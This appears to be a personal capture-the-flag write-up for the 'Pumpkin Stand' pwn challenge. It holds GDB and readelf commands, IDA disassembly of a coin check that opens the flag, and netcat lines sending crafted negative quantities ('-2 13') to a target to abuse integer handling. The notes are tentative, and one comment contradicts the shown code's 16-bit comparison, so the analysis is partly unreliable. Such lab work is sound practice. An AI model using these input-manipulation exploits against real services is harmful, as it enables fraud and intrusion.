# PWN - Pumpkin Stand

```sh
# uh I guess run included binary?
./pumpkin_stand

# no clue...

# format string exploiting?


readelf -e pumpkin_stand
# ./glibc/ld-linux-86-64.so.2
```

```
# GDB
gdb pumpkin_stand
gdb info file  # entry point 0x555555400850

set disassembly-flavor intel
layout asm
layout regs

# break at entry point
b *0x555555400850

# 0x55555540086d loads pointer to main

# 0x555555400874 call to libc_start_main
# https://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.html

# main   = 0x555555400b9e
# setup  = 0x555555400b2a
# banner = 0x5555554009eb
```

opened binary in IDA

```asm
loc_DOA:
movzx eax, cs:pumpcoins
cmp ax, 9998
jle loc_DBD

; leads to opening flag

; pumpcoins is double word (32-bit int)
; uint32 0-4294967295

; need to get pumpcoins >= 9999
```

First option, shovel, seems to have a bug allowing to overcharge.
Use truncation to get there?

30 shovels => 26763 pumpcoins ... "Good luck crafting this huge pumpkin with a shovel!"

```asm
loc_CC6:
movzx   eax, [rbp+var_4C]
cmp     ax, 1
jnz     short loc_D0A
; Do I need to buy 1 laser and then do the shovel nonsense?
```

-2, 13

```sh
# netcat

# test
echo 10 | nc $TARGET_IP $TARGET_PORT

echo "-2 13" | nc $TARGET_IP $TARGET_PORT
```

